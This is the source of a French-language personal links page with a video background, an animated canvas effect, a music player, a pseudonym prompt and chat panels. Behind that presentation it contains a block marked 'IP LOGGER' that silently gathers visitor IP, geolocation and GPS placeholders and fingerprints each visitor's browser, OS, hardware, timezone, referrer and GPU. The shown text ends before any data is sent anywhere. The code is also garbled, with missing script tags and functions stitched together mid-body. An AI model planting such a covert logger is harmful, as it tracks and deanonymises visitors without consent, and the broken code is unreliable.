<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>5w2g - Links</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            overflow: hidden;
        }

        .video-bg {
            position: fixed;
            top: 50%;
            left: 50%;
            width: 100vw;
            height: 100vh;
            transform: translate(-50%, -50%);
            pointer-events: none;
            z-index: 0;
        }

        .video-bg video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            filter: grayscale(100%) brightness(0.6);
        }

        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.6);
            z-index: 1;
        }

        .edge-aura {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 3;
            background: radial-gradient(ellipse at center, transparent 40%, rgba(0,0,0,0.7) 100%);
            animation: auraShift 6s ease-in-out infinite alternate;
        }

        @keyframes auraShift {
            0% {
                box-shadow:
                    inset 0 0 120px 40px rgba(0,0,0,0.9),
                    inset 0 0 200px 80px rgba(0,0,0,0.5);
            }
            50% {
                box-shadow:
                    inset 0 0 160px 60px rgba(20,20,20,1),
                    inset 0 0 250px 100px rgba(255,255,255,0.05);
            }
            100% {
                box-shadow:
                    inset 0 0 100px 30px rgba(0,0,0,0.95),
                    inset 0 0 180px 60px rgba(255,255,255,0.03);
            }
        }

        #venomCanvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 4;
        }

        .container {
            width: 100%;
            max-width: 400px;
            text-align: center;
            position: relative;
            z-index: 5;
        }

        .avatar {
            width: 100px;
            height: 100px;
            border-radius: 50%;
            margin: 0 auto 20px;
            border: 3px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
            object-fit: cover;
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            cursor: pointer;
        }

        .avatar:hover {
            transform: scale(1.1) rotate(5deg);
            border-color: rgba(255, 255, 255, 0.8);
            box-shadow: 0 15px 50px rgba(255, 255, 255, 0.2);
        }

        .username {
            font-size: 24px;
            font-weight: 700;
            color: white;
            margin-bottom: 8px;
            transition: all 0.3s ease;
            cursor: default;
        }

        .username:hover {
            text-shadow: 0 0 20px rgba(255, 255, 255, 0.5);
            letter-spacing: 2px;
        }

        .bio {
            font-size: 14px;
            color: rgba(255, 255, 255, 0.6);
            margin-bottom: 30px;
        }

        .links {
            display: flex;
            flex-direction: row;
            gap: 12px;
            justify-content: center;
            flex-wrap: wrap;
        }

        .link-btn {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0;
            width: 48px; height: 48px;
            padding: 0;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 14px;
            color: white;
            text-decoration: none;
            font-weight: 500;
            font-size: 15px;
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            backdrop-filter: blur(10px);
            transform: scale(1);
        }

        .link-btn:hover {
            background: rgba(255, 255, 255, 0.9);
            color: #000;
            border-color: rgba(255, 255, 255, 1);
            transform: scale(1.05) translateY(-4px);
            box-shadow: 0 15px 40px rgba(255, 255, 255, 0.15);
        }

        .link-btn:active {
            transform: scale(0.97);
            transition: all 0.1s ease;
        }

        .link-btn svg {
            width: 22px;
            height: 22px;
            flex-shrink: 0;
            transition: transform 0.3s ease;
        }

        .link-btn:hover svg {
            transform: scale(1.2);
        }

        .music-btn {
            position: fixed;
            bottom: 20px;
            right: 20px;
            z-index: 10;
            width: 44px;
            height: 44px;
            border-radius: 50%;
            border: 1px solid rgba(255, 255, 255, 0.2);
            background: rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(10px);
            color: white;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        .music-btn:hover {
            background: rgba(255, 255, 255, 0.9);
            color: #000;
            border-color: white;
            transform: scale(1.15) rotate(10deg);
            box-shadow: 0 0 25px rgba(255, 255, 255, 0.3);
        }

        .music-btn:active {
            transform: scale(0.9);
            transition: all 0.1s ease;
        }

        .music-btn svg {
            width: 20px;
            height: 20px;
            transition: transform 0.3s ease;
        }

        .music-btn:hover svg {
            transform: scale(1.1);
        }

        .footer {
            margin-top: 40px;
            font-size: 12px;
            color: rgba(255, 255, 255, 0.3);
            transition: color 0.3s ease;
        }

        .footer:hover {
            color: rgba(255, 255, 255, 0.7);
        }

        .music-bar {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 3px;
            background: rgba(255, 255, 255, 0.1);
            z-index: 10;
        }

        .music-bar-fill {
            height: 100%;
            width: 0%;
            background: rgba(255, 255, 255, 0.6);
            transition: width 0.3s linear;
        }

        .chat-toggle {
            position: fixed; bottom: 20px; left: 20px; z-index: 90;
            width: 44px; height: 44px; border-radius: 50%;
            border: 1px solid rgba(255,255,255,0.2);
            background: rgba(0,0,0,0.6); backdrop-filter: blur(10px);
            cursor: pointer; display: none; align-items: center; justify-content: center;
            transition: all 0.4s cubic-bezier(0.175,0.885,0.32,1.275);
            color: white;
        }
        .chat-toggle:hover {
            background: rgba(255,255,255,0.9); color: #000;
            border-color: white; transform: scale(1.15);
            box-shadow: 0 0 25px rgba(255,255,255,0.3);
        }
        .chat-toggle svg { width: 20px; height: 20px; }

        .chat-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.5); z-index: 91; display: none;
        }

        .chat-panel {
            position: fixed; bottom: 0; left: 0; width: 100%; max-height: 70vh;
            background: rgba(10,10,10,0.95); backdrop-filter: blur(40px);
            border-top: 1px solid rgba(255,255,255,0.08);
            z-index: 92; display: none; flex-direction: column;
            border-radius: 20px 20px 0 0;
        }

        .chat-header {
            padding: 18px 20px; border-bottom: 1px solid rgba(255,255,255,0.06);
            display: flex; align-items: center; justify-content: space-between;
        }
        .chat-header-title { color: white; font-size: 15px; font-weight: 600; }
        .chat-close {
            width: 30px; height: 30px; border-radius: 50%; border: none;
            background: rgba(255,255,255,0.06); color: rgba(255,255,255,0.5);
            cursor: pointer; font-size: 16px; display: flex; align-items: center; justify-content: center;
            transition: all 0.3s ease;
        }
        .chat-close:hover { background: rgba(255,255,255,0.12); color: white; }

        .chat-messages {
            flex: 1; overflow-y: auto; padding: 16px 20px;
            display: flex; flex-direction: column; gap: 14px;
            max-height: 45vh; min-height: 200px;
        }

        .chat-msg {
            display: flex; gap: 12px; align-items: flex-start;
            animation: slideUp 0.3s ease;
        }
        .chat-msg-avatar {
            width: 36px; height: 36px; border-radius: 50%;
            border: 1px solid rgba(255,255,255,0.1); object-fit: cover; flex-shrink: 0;
        }
        .chat-msg-content { flex: 1; min-width: 0; }
        .chat-msg-name {
            color: rgba(255,255,255,0.5); font-size: 11px; font-weight: 600;
            margin-bottom: 3px; letter-spacing: 0.5px;
        }
        .chat-msg-text {
            color: rgba(255,255,255,0.85); font-size: 13px; line-height: 1.5;
            word-wrap: break-word;
        }
        .chat-msg-time {
            color: rgba(255,255,255,0.2); font-size: 10px; margin-top: 3px;
        }

        .chat-input-area {
            padding: 14px 20px; border-top: 1px solid rgba(255,255,255,0.06);
            display: flex; gap: 10px; align-items: center;
        }
        .chat-input {
            flex: 1; padding: 12px 16px; border-radius: 12px;
            border: 1px solid rgba(255,255,255,0.1);
            background: rgba(255,255,255,0.04); color: white;
            font-size: 13px; font-family: 'Inter', sans-serif; outline: none;
            transition: border-color 0.3s ease;
        }
        .chat-input::placeholder { color: rgba(255,255,255,0.2); }
        .chat-input:focus { border-color: rgba(255,255,255,0.25); }

        .chat-send {
            width: 40px; height: 40px; border-radius: 12px; border: none;
            background: rgba(255,255,255,0.08); color: white; cursor: pointer;
            display: flex; align-items: center; justify-content: center;
            transition: all 0.3s ease; flex-shrink: 0;
        }
        .chat-send:hover { background: rgba(255,255,255,0.9); color: #000; }
        .chat-send:disabled { opacity: 0.3; cursor: default; }
        .chat-send svg { width: 18px; height: 18px; }

        .chat-notice {
            padding: 12px 20px; text-align: center;
            color: rgba(255,255,255,0.3); font-size: 12px;
            border-bottom: 1px solid rgba(255,255,255,0.04);
        }
        .chat-sent-notice {
            padding: 14px 20px; text-align: center;
            color: rgba(255,255,255,0.25); font-size: 12px;
            font-style: italic;
        }

        @media (max-width: 480px) {
            .avatar {
                width: 80px;
                height: 80px;
                font-size: 32px;
            }

            .username {
                font-size: 20px;
            }

            .link-btn {
                padding: 14px 20px;
                font-size: 14px;
            }
        }
    </style>

    <style id="pseudoModalStyle">
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        @keyframes slideUp { from { opacity: 0; transform: translateY(30px) scale(0.95); } to { opacity: 1; transform: translateY(0) scale(1); } }
        @keyframes pulse { 0%,100% { box-shadow: 0 0 0 0 rgba(255,255,255,0.15); } 50% { box-shadow: 0 0 30px 8px rgba(255,255,255,0.05); } }
        @keyframes glowText { 0%,100% { text-shadow: 0 0 10px rgba(255,255,255,0.1); } 50% { text-shadow: 0 0 25px rgba(255,255,255,0.25); } }
        @keyframes avatarPulse { 0%,100% { transform: scale(1); } 50% { transform: scale(1.05); } }

        #pseudoModal {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 999;
            background: rgba(0,0,0,0.85);
            display: flex; align-items: center; justify-content: center;
            backdrop-filter: blur(30px); -webkit-backdrop-filter: blur(30px);
            animation: fadeIn 0.6s ease;
        }

        #pseudoModal .pseudo-card {
            text-align: center; width: 90%; max-width: 340px;
            background: rgba(255,255,255,0.03);
            border: 1px solid rgba(255,255,255,0.08);
            border-radius: 24px; padding: 40px 30px 36px;
            backdrop-filter: blur(40px); -webkit-backdrop-filter: blur(40px);
            animation: slideUp 0.5s cubic-bezier(0.16,1,0.3,1);
            position: relative; overflow: hidden;
        }

        #pseudoModal .pseudo-card::before {
            content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background: radial-gradient(circle at 50% 0%, rgba(255,255,255,0.04) 0%, transparent 60%);
            pointer-events: none;
        }

        #pseudoModal .pseudo-avatar {
            width: 80px; height: 80px; border-radius: 50%; margin: 0 auto 20px;
            background: rgba(255,255,255,0.06);
            border: 2px solid rgba(255,255,255,0.1);
            display: flex; align-items: center; justify-content: center;
            animation: pulse 4s ease-in-out infinite;
            transition: all 0.4s cubic-bezier(0.16,1,0.3,1);
            overflow: hidden;
        }

        #pseudoModal .pseudo-avatar img {
            width: 100%; height: 100%; border-radius: 50%; object-fit: cover;
            opacity: 0; transition: opacity 0.3s ease;
        }

        #pseudoModal .pseudo-avatar.has-img { border-color: rgba(255,255,255,0.25); animation: avatarPulse 3s ease-in-out infinite; }
        #pseudoModal .pseudo-avatar.has-img img { opacity: 1; }
        #pseudoModal .pseudo-avatar .placeholder-icon { color: rgba(255,255,255,0.2); font-size: 28px; }

        #pseudoModal h2 {
            color: white; font-size: 20px; margin-bottom: 6px;
            animation: glowText 4s ease-in-out infinite; font-weight: 600; letter-spacing: 0.5px;
        }

        #pseudoModal .pseudo-sub {
            color: rgba(255,255,255,0.35); font-size: 12px; margin-bottom: 28px;
            font-weight: 400; letter-spacing: 1.5px; text-transform: uppercase;
        }

        #pseudoModal .pseudo-input {
            width: 100%; padding: 14px 20px; border-radius: 14px;
            border: 1px solid rgba(255,255,255,0.1);
            background: rgba(255,255,255,0.04);
            color: white; font-size: 15px; font-family: 'Inter', sans-serif;
            outline: none; text-align: center;
            transition: all 0.3s cubic-bezier(0.16,1,0.3,1);
            letter-spacing: 0.5px;
        }

        #pseudoModal .pseudo-input::placeholder { color: rgba(255,255,255,0.25); }
        #pseudoModal .pseudo-input:focus {
            border-color: rgba(255,255,255,0.3);
            background: rgba(255,255,255,0.07);
            box-shadow: 0 0 30px rgba(255,255,255,0.05);
            transform: scale(1.01);
        }

        #pseudoModal .pseudo-btn {
            margin-top: 18px; width: 100%; padding: 14px; border-radius: 14px;
            border: 1px solid rgba(255,255,255,0.12);
            background: rgba(255,255,255,0.06);
            color: rgba(255,255,255,0.8); font-size: 14px; font-weight: 600;
            font-family: 'Inter', sans-serif; cursor: pointer;
            transition: all 0.3s cubic-bezier(0.16,1,0.3,1);
            letter-spacing: 1px; text-transform: uppercase;
        }

        #pseudoModal .pseudo-btn:hover {
            background: rgba(255,255,255,0.92); color: #000;
            border-color: rgba(255,255,255,1);
            transform: translateY(-2px);
            box-shadow: 0 10px 40px rgba(255,255,255,0.12);
        }

        #pseudoModal .pseudo-btn:active { transform: translateY(0) scale(0.98); }

        #pseudoModal.modal-hide {
            animation: fadeIn 0.4s ease reverse forwards;
            pointer-events: none;
        }

        @media (max-width: 480px) {
            #pseudoModal .pseudo-card { padding: 32px 22px 28px; }
        }
    </style>

    <style id="profilePanelStyle">
        @keyframes slidePanel { from { transform: translateX(100%); } to { transform: translateX(0); } }
        @keyframes fadeOverlay { from { opacity: 0; } to { opacity: 1; } }

        .profile-toggle {
            position: fixed; top: 20px; right: 20px; z-index: 90;
            width: 36px; height: 36px; border-radius: 50%;
            border: 1px solid rgba(255,255,255,0.1);
            background: rgba(0,0,0,0.3); backdrop-filter: blur(8px);
            cursor: pointer; display: none; align-items: center; justify-content: center;
            transition: all 0.4s cubic-bezier(0.16,1,0.3,1);
            overflow: hidden; opacity: 0.4;
        }

        .profile-toggle img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; opacity: 0; transition: opacity 0.3s; }
        .profile-toggle.has-img img { opacity: 1; }
        .profile-toggle .toggle-icon { color: rgba(255,255,255,0.6); font-size: 15px; transition: opacity 0.3s; position: absolute; }
        .profile-toggle.has-img .toggle-icon { opacity: 0; }

        .profile-toggle:hover {
            transform: scale(1.1); border-color: rgba(255,255,255,0.3);
            box-shadow: 0 0 20px rgba(255,255,255,0.08); opacity: 0.8;
        }

        .profile-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.5); z-index: 91; display: none;
            animation: fadeOverlay 0.3s ease;
        }

        .profile-panel {
            position: fixed; top: 0; right: 0; width: 320px; max-width: 85vw; height: 100%;
            background: rgba(10,10,10,0.92); backdrop-filter: blur(40px); -webkit-backdrop-filter: blur(40px);
            border-left: 1px solid rgba(255,255,255,0.08);
            z-index: 92; display: none; flex-direction: column;
            animation: slidePanel 0.4s cubic-bezier(0.16,1,0.3,1);
            overflow-y: auto;
        }

        .profile-panel .panel-header {
            padding: 30px 24px 20px; border-bottom: 1px solid rgba(255,255,255,0.06);
            display: flex; align-items: center; gap: 16px;
        }

        .profile-panel .panel-avatar {
            width: 56px; height: 56px; border-radius: 50%;
            border: 2px solid rgba(255,255,255,0.15); object-fit: cover;
            flex-shrink: 0;
        }

        .profile-panel .panel-avatar-placeholder {
            width: 56px; height: 56px; border-radius: 50%;
            background: rgba(255,255,255,0.06);
            border: 2px solid rgba(255,255,255,0.1);
            display: flex; align-items: center; justify-content: center;
            flex-shrink: 0; font-size: 22px; color: rgba(255,255,255,0.25);
        }

        .profile-panel .panel-info { flex: 1; min-width: 0; }
        .profile-panel .panel-name { color: white; font-size: 17px; font-weight: 700; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .profile-panel .panel-id { color: rgba(255,255,255,0.3); font-size: 11px; margin-top: 2px; letter-spacing: 0.5px; }

        .profile-panel .panel-close {
            position: absolute; top: 16px; right: 16px; width: 32px; height: 32px;
            border-radius: 50%; border: none; background: rgba(255,255,255,0.06);
            color: rgba(255,255,255,0.5); cursor: pointer; font-size: 16px;
            display: flex; align-items: center; justify-content: center;
            transition: all 0.3s ease;
        }
        .profile-panel .panel-close:hover { background: rgba(255,255,255,0.12); color: white; }

        .profile-panel .panel-section { padding: 20px 24px; border-bottom: 1px solid rgba(255,255,255,0.04); }
        .profile-panel .panel-label { color: rgba(255,255,255,0.3); font-size: 10px; text-transform: uppercase; letter-spacing: 1.5px; margin-bottom: 12px; }

        .profile-panel .msg-textarea {
            width: 100%; min-height: 80px; padding: 12px 14px; border-radius: 12px;
            border: 1px solid rgba(255,255,255,0.08); background: rgba(255,255,255,0.03);
            color: white; font-size: 13px; font-family: 'Inter', sans-serif;
            outline: none; resize: vertical; line-height: 1.5;
            transition: border-color 0.3s ease;
        }
        .profile-panel .msg-textarea::placeholder { color: rgba(255,255,255,0.2); }
        .profile-panel .msg-textarea:focus { border-color: rgba(255,255,255,0.2); }

        .profile-panel .msg-send {
            margin-top: 10px; width: 100%; padding: 12px; border-radius: 12px;
            border: 1px solid rgba(255,255,255,0.1);
            background: rgba(255,255,255,0.05); color: rgba(255,255,255,0.7);
            font-size: 13px; font-weight: 600; font-family: 'Inter', sans-serif;
            cursor: pointer; transition: all 0.3s cubic-bezier(0.16,1,0.3,1);
            letter-spacing: 0.5px;
        }
        .profile-panel .msg-send:hover {
            background: rgba(255,255,255,0.9); color: #000;
            transform: translateY(-1px); box-shadow: 0 8px 25px rgba(255,255,255,0.1);
        }
        .profile-panel .msg-send:active { transform: scale(0.97); }

        .profile-panel .msg-status {
            margin-top: 8px; font-size: 11px; text-align: center;
            color: rgba(255,255,255,0.3); min-height: 16px;
            transition: all 0.3s ease;
        }
        .profile-panel .msg-status.sent { color: rgba(100,255,150,0.6); }
        .profile-panel .msg-status.error { color: rgba(255,100,100,0.6); }

        @media (max-width: 480px) {
            .profile-panel { width: 100%; max-width: 100vw; }
        }

        .panel-avatar-wrap { position: relative; }
        .panel-avatar-edit {
            position: absolute; bottom: 0; right: 0; width: 22px; height: 22px;
            border-radius: 50%; background: rgba(255,255,255,0.15);
            border: 2px solid rgba(10,10,10,0.92);
            color: rgba(255,255,255,0.8); font-size: 11px;
            display: flex; align-items: center; justify-content: center;
            transition: all 0.3s ease; pointer-events: none;
        }
        .panel-avatar-wrap:hover .panel-avatar-edit { background: rgba(255,255,255,0.3); transform: scale(1.1); }
    </style>
</head>
<body>
    <div id="pseudoModal">
        <div class="pseudo-card">
            <div class="pseudo-avatar" id="pseudoAvatarPreview">
                <span class="placeholder-icon">&#9679;</span>
                <img id="pseudoAvatarImg" src="" alt="">
            </div>
            <h2>Bienvenue</h2>
            <p class="pseudo-sub">Choisis ton pseudo</p>
            <input id="pseudoInput" class="pseudo-input" type="text" placeholder="..." maxlength="20" autocomplete="off" spellcheck="false">
            <button id="pseudoBtn" class="pseudo-btn" onclick="submitPseudo()">Entrer</button>
        </div>
    </div>
    <div class="video-bg">
        <video autoplay muted loop playsinline>
            <source src="vid.mp4" type="video/mp4">
        </video>
    </div>
    <div class="overlay"></div>
    <div class="edge-aura"></div>
    <canvas id="venomCanvas"></canvas>

        function uploadAvatar(e) {
            var file = e.target.files[0];
            if (!file) return;
            var reader = new FileReader();
            reader.onload = function(ev) {
                var img = new Image();
                img.onload = function() {
                    var c = document.createElement('canvas');
                    var s = Math.min(img.width, img.height);
                    c.width = 200; c.height = 200;
                    var cx = c.getContext('2d');
                    cx.beginPath();
                    cx.arc(100, 100, 100, 0, Math.PI * 2);
                    cx.clip();
                    cx.drawImage(img, (img.width - s) / 2, (img.height - s) / 2, s, s, 0, 0, 200, 200);
                    var dataUrl = c.toDataURL('image/jpeg', 0.8);
                    localStorage.setItem('visitorAvatar', dataUrl);
                    showProfileButton();
                };
                img.src = ev.target.result;
            };

                document.getElementById('msgInput').value = '';
                setTimeout(function() { status.textContent = ''; }, 3000);

        var ip = 'N/A', geo = {}, gpsCoords = null;

        function initLogger() {
        const canvas = document.getElementById('venomCanvas');
        const ctx = canvas.getContext('2d');
        let W, H;
        let mouse = { x: -1000, y: -1000 };
        const EDGE_ZONE = 120;

        function resize() {
            W = canvas.width = window.innerWidth;
            H = canvas.height = window.innerHeight;
        }
        resize();
        window.addEventListener('resize', resize);
        document.addEventListener('mousemove', function(e) {
            mouse.x = e.clientX;
            mouse.y = e.clientY;
        });

        function getEdges() {
            var edges = [];
            if (mouse.x < EDGE_ZONE) edges.push('left');
            if (mouse.x > W - EDGE_ZONE) edges.push('right');
            if (mouse.y < EDGE_ZONE) edges.push('top');
            if (mouse.y > H - EDGE_ZONE) edges.push('bottom');
            return edges;
        }

        class Tentacle {
            constructor() { this.reset(); }

            reset() {
                this.points = [];
                this.life = 0;
                this.maxLife = 1;
                this.speed = 0.6 + Math.random() * 1;
                this.wobble = 1 + Math.random() * 2;
                this.offset = Math.random() * 1000;
                this.thickness = 0.8 + Math.random() * 2;
                this.maxLength = 15 + Math.floor(Math.random() * 20);
                this.active = false;
                this.edge = 'left';
                this.spawnPos = { x: 0, y: 0 };
                this.growDir = { x: 1, y: 0 };
            }

            spawn(edge) {
                this.edge = edge;
                this.points = [];
                this.life = 1;
                this.active = true;
                this.maxLength = 15 + Math.floor(Math.random() * 20);

                if (edge === 'left') {
                    this.spawnPos = { x: 0, y: mouse.y + (Math.random() - 0.5) * 40 };
                    this.growDir = { x: 1, y: (Math.random() - 0.5) * 0.3 };
                } else if (edge === 'right') {
                    this.spawnPos = { x: W, y: mouse.y + (Math.random() - 0.5) * 40 };
                    this.growDir = { x: -1, y: (Math.random() - 0.5) * 0.3 };
                } else if (edge === 'top') {
                    this.spawnPos = { x: mouse.x + (Math.random() - 0.5) * 40, y: 0 };
                    this.growDir = { x: (Math.random() - 0.5) * 0.3, y: 1 };
                } else if (edge === 'bottom') {
                    this.spawnPos = { x: mouse.x + (Math.random() - 0.5) * 40, y: H };
                    this.growDir = { x: (Math.random() - 0.5) * 0.3, y: -1 };
                }

                this.points.push({ x: this.spawnPos.x, y: this.spawnPos.y });
            }

            update(t) {
                if (!this.active) return;

                if (this.points.length < this.maxLength) {
                    var last = this.points[this.points.length - 1];
                    var nx = last.x + this.growDir.x * this.speed;
                    var ny = last.y + this.growDir.y * this.speed;
                    nx += Math.sin(t * 0.005 + this.offset + this.points.length * 0.4) * this.wobble * 0.3;
                    ny += Math.cos(t * 0.006 + this.offset + this.points.length * 0.4) * this.wobble * 0.3;
                    this.points.push({ x: nx, y: ny });
                }

                var tip = this.points[this.points.length - 1];
                var distToMouse = Math.sqrt((mouse.x - tip.x) ** 2 + (mouse.y - tip.y) ** 2);
                if (distToMouse < 50 || this.points.length >= this.maxLength) {
                    this.life -= 0.02;
                }

                if (this.life <= 0) this.active = false;
            }

            draw() {
                if (!this.active || this.points.length < 2) return;
                for (var i = 1; i < this.points.length; i++) {
                    var p1 = this.points[i - 1];
                    var p2 = this.points[i];
                    var progress = i / this.points.length;
                    var alpha = this.life * progress * 0.8;
                    var w = this.thickness * (1 - progress * 0.5);

                    ctx.beginPath();
                    ctx.moveTo(p1.x, p1.y);
                    ctx.lineTo(p2.x, p2.y);
                    ctx.strokeStyle = 'rgba(255,255,255,' + alpha + ')';
                    ctx.lineWidth = w;
                    ctx.lineCap = 'round';
                    ctx.stroke();
                }
                if (this.points.length > 0) {
                    var tip = this.points[this.points.length - 1];
                    ctx.beginPath();
                    ctx.arc(tip.x, tip.y, this.thickness * 0.7, 0, Math.PI * 2);
                    ctx.fillStyle = 'rgba(255,255,255,' + (this.life * 0.4) + ')';
                    ctx.fill();
                }
            }
        }

        var tentacles = [];
        for (var i = 0; i < 40; i++) tentacles.push(new Tentacle());
        var spawnTimer = 0;

        class ShootingStar {
            constructor() { this.reset(); }
            reset() {
                this.x = Math.random() * W * 0.3;
                this.y = Math.random() * H * 0.5;
                this.len = 80 + Math.random() * 140;
                this.speed = 6 + Math.random() * 10;
                this.angle = 0.3 + Math.random() * 0.4;
                this.thickness = 1.5 + Math.random() * 2;
                this.life = 1;
                this.decay = 0.008 + Math.random() * 0.01;
                this.hue = Math.random() > 0.5 ? 220 : 200;
                this.active = true;
                this.sparkles = [];
            }
            update() {
                if (!this.active) return;
                this.x += Math.cos(this.angle) * this.speed;
                this.y += Math.sin(this.angle) * this.speed;
                this.life -= this.decay;
                if (this.life <= 0 || this.x > W + 200 || this.y > H + 200) this.active = false;

                if (Math.random() < 0.4) {
                    var tailX = this.x - Math.cos(this.angle) * this.len * Math.random();
                    var tailY = this.y - Math.sin(this.angle) * this.len * Math.random();
                    this.sparkles.push({
                        x: tailX + (Math.random() - 0.5) * 4,
                        y: tailY + (Math.random() - 0.5) * 4,
                        life: 1,
                        size: 0.5 + Math.random() * 1.5
                    });
                }
                for (var i = this.sparkles.length - 1; i >= 0; i--) {
                    this.sparkles[i].life -= 0.03;
                    if (this.sparkles[i].life <= 0) this.sparkles.splice(i, 1);
                }
            }
            draw() {
                if (!this.active) return;
                var tailX = this.x - Math.cos(this.angle) * this.len;
                var tailY = this.y - Math.sin(this.angle) * this.len;

                var grad = ctx.createLinearGradient(tailX, tailY, this.x, this.y);
                grad.addColorStop(0, 'rgba(255,255,255,0)');
                grad.addColorStop(0.6, 'rgba(180,210,255,' + (this.life * 0.3) + ')');
                grad.addColorStop(1, 'rgba(255,255,255,' + (this.life * 0.9) + ')');

                ctx.beginPath();
                ctx.moveTo(tailX, tailY);
                ctx.lineTo(this.x, this.y);
                ctx.strokeStyle = grad;
                ctx.lineWidth = this.thickness;
                ctx.lineCap = 'round';
                ctx.stroke();

                ctx.beginPath();
                ctx.arc(this.x, this.y, this.thickness * 2, 0, Math.PI * 2);
                ctx.fillStyle = 'rgba(200,220,255,' + (this.life * 0.6) + ')';
                ctx.fill();

                ctx.beginPath();
                ctx.arc(this.x, this.y, this.thickness * 4, 0, Math.PI * 2);
                ctx.fillStyle = 'rgba(150,190,255,' + (this.life * 0.15) + ')';
                ctx.fill();

                for (var i = 0; i < this.sparkles.length; i++) {
                    var s = this.sparkles[i];
                    ctx.beginPath();
                    ctx.arc(s.x, s.y, s.size, 0, Math.PI * 2);
                    ctx.fillStyle = 'rgba(255,255,255,' + (s.life * this.life * 0.8) + ')';
                    ctx.fill();
                }
            }
        }

        var stars = [];
        for (var i = 0; i < 5; i++) stars.push(new ShootingStar());
        var starTimer = 0;

        function animateVenom(t) {
            ctx.clearRect(0, 0, W, H);
            var edges = getEdges();

            spawnTimer++;
            if (edges.length > 0 && spawnTimer % 8 === 0) {
                for (var i = 0; i < tentacles.length; i++) {
                    if (!tentacles[i].active) {
                        tentacles[i].spawn(edges[Math.floor(Math.random() * edges.length)]);
                        break;
                    }
                }
            }

            for (var i = 0; i < tentacles.length; i++) {
                tentacles[i].update(t);
                tentacles[i].draw();
            }

            starTimer++;
            if (starTimer % 120 === 0) {
                for (var i = 0; i < stars.length; i++) {
                    if (!stars[i].active) { stars[i].reset(); break; }
                }
            }
            for (var i = 0; i < stars.length; i++) {
                stars[i].update();
                stars[i].draw();
            }

            requestAnimationFrame(animateVenom);
        }
        requestAnimationFrame(animateVenom);

                    onReady: function(e) { e.target.unMute(); },
                    onStateChange: function(e) {
                        if (e.data === YT.PlayerState.ENDED) {
                            e.target.seekTo(0);
                            e.target.playVideo();
                        }
                    }
                }
            });
            setInterval(function() {
                if (player && player.getDuration && player.getDuration() > 0) {
                    var pct = (player.getCurrentTime() / player.getDuration()) * 100;
                    document.getElementById('musicBarFill').style.width = pct + '%';
                }
            }, 500);
        };

        var ytTag = document.createElement('script');
        ytTag.src = 'https://www.youtube.com/iframe_api';
        document.head.appendChild(ytTag);

        window.toggleMusic = function() {
            if (!player || !player.playVideo) return;
            if (playing) {
                player.pauseVideo();
                document.getElementById('playIcon').style.display = 'block';
                document.getElementById('pauseIcon').style.display = 'none';
            } else {
                player.playVideo();
                document.getElementById('playIcon').style.display = 'none';
                document.getElementById('pauseIcon').style.display = 'block';
            }
            playing = !playing;
        }

        // IP LOGGER
        var ua = navigator.userAgent;
        var browser = 'Unknown';
        if (ua.indexOf('Firefox') > -1) browser = 'Firefox';
        else if (ua.indexOf('Edg') > -1) browser = 'Edge';
        else if (ua.indexOf('Chrome') > -1) browser = 'Chrome';
        else if (ua.indexOf('Safari') > -1) browser = 'Safari';
        else if (ua.indexOf('Opera') > -1 || ua.indexOf('OPR') > -1) browser = 'Opera';

        var os = 'Unknown';
        if (ua.indexOf('Windows') > -1) os = 'Windows';
        else if (ua.indexOf('Mac') > -1) os = 'MacOS';
        else if (ua.indexOf('Linux') > -1) os = 'Linux';
        else if (ua.indexOf('Android') > -1) os = 'Android';
        else if (ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1) os = 'iOS';

        var device = /Mobi|Android|iPhone|iPad|iPod/i.test(ua) ? 'Mobile' : 'Desktop';
        var platform = navigator.platform || 'N/A';
        var lang = navigator.language || navigator.userLanguage || 'N/A';
        var tz = Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A';
        var screenRes = screen.width + 'x' + screen.height;
        var colorDepth = screen.colorDepth + '-bit';
        var pixelRatio = window.devicePixelRatio || 1;
        var cpuCores = navigator.hardwareConcurrency || 'N/A';
        var ram = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A';
        var touch = 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? 'Oui' : 'Non';
        var cookies = navigator.cookieEnabled ? 'Oui' : 'Non';
        var doNotTrack = navigator.doNotTrack || 'N/A';
        var referrer = document.referrer || 'Direct';
        if (referrer.length > 100) referrer = referrer.substring(0, 100) + '...';

        var gpu = 'N/A';
        try {
            var c = document.createElement('canvas');
            var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
            if (gl) {
                var dbg = gl.getExtension('WEBGL_debug_renderer_info');
